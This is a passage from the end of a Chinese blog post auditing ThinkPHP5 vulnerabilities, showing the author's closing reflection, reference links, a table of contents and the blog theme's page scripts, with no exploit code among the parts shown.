+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614201310090.png" alt="image-20240614201310090"></p>
+<h1 id="0x04-总结">0x04 总结</h1>
+<p>废了很多天，也看了很多文章，对于tp5的框架算是有了一个认识，同时在分析漏洞的时候，感觉到慢慢的不再吃力，但却仍然很多不足，比如学不到佬们的分析思路，我只会依葫芦画瓢，只能说，但对于这个漏洞的原理和流程有了认识（这应该是我的目的）。</p>
+<p>总之代码审计还是困难，继续努力</p>
+<h1 id="0x05-参考文章">0x05 参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://github.com/lu2ker/PHP-Code/blob/main/TP5%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E8%B7%AF%E7%94%B1).md">TP5框架简单理解</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/16102644.html">ThinkPHP v5.0.10代码审计</a></p>
+<p><a target="_blank" rel="noopener" href="https://xeldax.top/article/thinkphp_5_0_x_RCE#">THINKPHP 5.0.X远程代码执行 RCE分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">ThinkPHP-Vuln</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570?time__1311=n4%2BxnD0DBDgDyjYG8DlhAe5r%3Dx977mmDIhiD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/06/15/du-web-gong-fang-you-gan/">读web攻防有感</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/06/10/thm-exploiting-active-directory/">THM-Exploiting Active Directory</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-thinkphp5%E5%9F%BA%E7%A1%80"><span class="toc-text">0x02 ThinkPHP5基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mvc%E6%A8%A1%E5%BC%8F%E6%B5%81%E7%A8%8B"><span class="toc-text">MVC模式流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-text">目录结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-text">初始目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6"><span class="toc-text">入口文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6"><span class="toc-text">静态资源文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F"><span class="toc-text">调试模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">控制器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%86%E5%9B%BE"><span class="toc-text">视图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#urlamp%E8%B7%AF%E7%94%B1"><span class="toc-text">URL&amp;路由</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E8%AE%BF%E9%97%AE"><span class="toc-text">URL访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E4%BC%A0%E5%85%A5"><span class="toc-text">参数传入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9A%E4%B9%89%E8%B7%AF%E7%94%B1"><span class="toc-text">自定义定义路由</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%B0%E6%A8%A1%E5%9D%97%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">路由到模块&#x2F;控制器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%B0%E9%87%8D%E5%AE%9A%E5%90%91%E5%9C%B0%E5%9D%80"><span class="toc-text">路由到重定向地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%B0%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">路由到控制器的方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%B0%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">路由到类的方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8"><span class="toc-text">安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A9%BA%E9%97%B4"><span class="toc-text">命令空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">框架流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#url%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">URL路由解析动态调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%AE%9A%E4%B9%89"><span class="toc-text">路由定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%A3%80%E6%B5%8B"><span class="toc-text">路由检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90"><span class="toc-text">路由解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E8%B0%83%E5%BA%A6"><span class="toc-text">路由调度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E8%BE%93%E5%87%BA%E5%8F%8A%E5%BA%94%E7%94%A8%E7%BB%93%E6%9D%9F"><span class="toc-text">响应输出及应用结束</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x03 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rce1%E7%B1%BB%E5%90%8D%E8%A7%A3%E6%9E%90%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%B1%BB%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-text">RCE1—类名解析导致任意类方法调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-text">问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce2request%E6%A0%B8%E5%BF%83%E7%B1%BB%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">RCE2—Request核心类变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce3-cache%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%86%99webshell"><span class="toc-text">RCE3-Cache缓存文件写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5parsewhereitem"><span class="toc-text">SQL注入—parseWhereItem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-text">0x04 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x05 参考文章</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
+    });
+</script>
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
